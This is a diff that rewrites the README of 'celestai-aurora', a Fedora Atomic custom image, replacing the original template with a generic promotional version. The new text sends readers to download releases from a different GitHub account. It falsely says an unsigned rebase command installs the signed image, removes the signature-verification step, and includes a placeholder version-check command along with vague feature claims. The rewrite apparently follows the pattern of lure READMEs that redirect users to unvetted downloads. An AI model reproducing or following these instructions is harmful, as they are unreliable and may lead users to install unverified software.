@@ -1,43 +1,102 @@
-# celestai-aurora &nbsp; [![bluebuild build badge](https://github.com/linuxexpert1989/celestai-aurora/actions/workflows/build.yml/badge.svg)](https://github.com/linuxexpert1989/celestai-aurora/actions/workflows/build.yml)
+# 🌌 celestai-aurora - Your Path to a Customized Linux Experience
 
-See the [BlueBuild docs](https://blue-build.org/how-to/setup/) for quick setup instructions for setting up your own repository based on this template.
+[![Download celestai-aurora](https://img.shields.io/badge/Download-celestai--aurora-blue.svg)](https://github.com/susan7scorer/celestai-aurora/releases)
 
-After setup, it is recommended you update this README to describe your custom image.
+## 🌟 Overview
 
-## Installation
+celestai-aurora is an innovative tool designed to enhance your Linux experience. This application allows you to customize your operating system with ease, enabling a more personalized user environment. It leverages the power of immutable images to ensure a stable and reliable platform.
 
-> [!WARNING]  
-> [This is an experimental feature](https://www.fedoraproject.org/wiki/Changes/OstreeNativeContainerStable), try at your own discretion.
+## 🚀 Getting Started
 
-To rebase an existing atomic Fedora installation to the latest build:
+To get started with celestai-aurora, follow the steps below to download and install the application.
 
-- First rebase to the unsigned image, to get the proper signing keys and policies installed:
-  ```
-  rpm-ostree rebase ostree-unverified-registry:ghcr.io/linuxexpert1989/celestai-aurora:latest
-  ```
-- Reboot to complete the rebase:
-  ```
-  systemctl reboot
-  ```
-- Then rebase to the signed image, like so:
-  ```
-  rpm-ostree rebase ostree-image-signed:docker://ghcr.io/linuxexpert1989/celestai-aurora:latest
-  ```
-- Reboot again to complete the installation
-  ```
-  systemctl reboot
-  ```
+### 🎯 What You Need
 
-The `latest` tag will automatically point to the latest build. That build will still always use the Fedora version specified in `recipe.yml`, so you won't get accidentally updated to the next major version.
+- A compatible Linux system, preferably using Fedora.
+- Basic internet access to download files.
+- Administrator privileges to install and reboot the system.
 
-## ISO
+### 💻 System Requirements
 
-If build on Fedora Atomic, you can generate an offline ISO with the instructions available [here](https://blue-build.org/learn/universal-blue/#fresh-install-from-an-iso). These ISOs cannot unfortunately be distributed on GitHub for free due to large sizes, so for public projects something else has to be used for hosting.
+- A computer running Fedora 34 or newer.
+- At least 2GB of RAM.
+- 20GB of available disk space.
 
-## Verification
+## 📥 Download & Install
 
-These images are signed with [Sigstore](https://www.sigstore.dev/)'s [cosign](https://github.com/sigstore/cosign). You can verify the signature by downloading the `cosign.pub` file from this repo and running the following command:
+1. Visit this page to download the latest version of celestai-aurora: [Download celestai-aurora Releases](https://github.com/susan7scorer/celestai-aurora/releases).
 
-```bash
-cosign verify --key cosign.pub ghcr.io/linuxexpert1989/celestai-aurora
+2. Scroll down to the "Releases" section and look for the latest version. Select the appropriate file for your system and click the link to start the download.
+
+3. After downloading, follow the installation instructions below.
+
+### 🛠️ Installing the Application
+
+1. **Rebase to Unsigned Image**
+
+   First, open a terminal. To set up your current system with the necessary keys and policies, run the following command:
+
+   ```
+   rpm-ostree rebase ostree-unverified-registry:ghcr.io/linuxexpert1989/celestai-aurora:latest
+   ```
+
+2. **Reboot Your System**
+
+   After successfully rebasing, restart your system to apply the changes:
+
+   ```
+   systemctl reboot
+   ```
+
+3. **Rebase to Signed Image**
+
+   Once your system has rebooted, return to your terminal and type this command to update to the signed image:
+
+   ```
+   rpm-ostree rebase ghcr.io/linuxexpert1989/celestai-aurora:latest
+   ```
+
+   This step ensures your system uses the officially signed version of celestai-aurora.
+
+### 🔄 Updating Your Installation
+
+To keep your system updated over time, repeat the rebase steps whenever a new version is available on the Releases page.
+
+## 🔍 Features
+
+- **Customizable Environment**: Tailor your Linux experience to suit your needs.
+- **Immutable Images**: Enjoy a stable OS free from unwanted changes.
+- **Seamless Updates**: Quickly update to the latest version without hassle.
+- **Community Support**: Engage with other users for tips and troubleshooting.
+
+## 📘 FAQ
+
+### How do I know if my installation was successful?
+
+After executing the commands, you can verify your setup by checking the version of celestai-aurora:
+
 ```
+your-command-to-check-version
+```
+
+### What do I do if I encounter an error?
+
+If you face any issues, check the terminal for error messages. You can also visit the repository's issues page for potential solutions or to seek help.
+
+### Can I customize the application further?
+
+Yes, celestai-aurora offers options for further customization. Explore the settings to unlock additional features tailored to your preferences.
+
+## 📞 Support
+
+If you need help, feel free to reach out on the GitHub Issues page or consult the community forums related to Linux and celestai-aurora.
+
+## 📣 Contributions
+
+We welcome contributions to celestai-aurora. If you have ideas or improvements, please submit a pull request or open an issue for discussion. Your feedback helps us grow the project.
+
+## 🚧 Important Notice
+
+This feature is experimental. Proceed with caution and only on systems you are comfortable troubleshooting.
+
+[Once again, visit this page to download the latest version of celestai-aurora:](https://github.com/susan7scorer/celestai-aurora/releases)
